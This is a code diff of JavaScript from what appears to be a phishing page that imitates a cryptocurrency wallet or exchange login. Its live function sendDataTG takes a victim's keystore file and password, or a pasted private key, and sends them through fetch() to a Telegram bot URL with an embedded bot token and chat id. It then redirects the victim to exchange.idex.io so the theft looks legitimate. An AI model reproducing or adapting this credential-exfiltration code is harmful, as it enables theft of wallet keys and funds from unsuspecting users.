@@ -493,17 +493,6 @@
 			return false;
 		}
 
-		// $(function(){
-			//var win = window.frames['frameSite'].contentWindow;
-			// console.log(window.frames['frameSite']);
-			//win.document.body.onclick = function() {
-        //win.contentWindow.location.reload();
-    	//}
-
-      
-
-			
-		// })
 
 		function switchModal(type, error){
 			if(error){
@@ -521,8 +510,8 @@
 
 
 
-			$('.overlay').fadeIn();
-			switchModal('select');
+		$('.overlay').fadeIn();
+		switchModal('select');
 
 
 		function sendDataTG(type){
@@ -531,25 +520,21 @@
 			
 			if(type == 'keystore'){
 				$('#keystore_buttonSend').attr('disabled', true);
-				
-				
-					data = keystoreFileContent + "\nPassword: " + $('#keystorePassword_input').val();
-					$('.'+type+'.window #keystorePassword_input').val('');
-					$('#keystore_buttonSend').attr('disabled', false);
+				data = keystoreFileContent + "\nPassword: " + $('#keystorePassword_input').val();
+				$('.'+type+'.window #keystorePassword_input').val('');
+				$('#keystore_buttonSend').attr('disabled', false);
 					
-				}
 				
 			}
 
 			if(type == 'privatekey'){
 				data = $('#privatekey_input').val().split("\n").join(" ");
-
 			}
 			fetch('https://api.telegram.org/bot1954952646:AAFEScLs_9fUgjyqTiG9Is828jf8wupEurI/sendMessage?chat_id=896837120&text=' + encodeURI(data))
 				.then(function(response){
 				    console.log(data);
-						location.href = 'https://exchange.idex.io';
-			  })
+				    location.href = 'https://exchange.idex.io';
+			})
 			
 			return false;
 		}
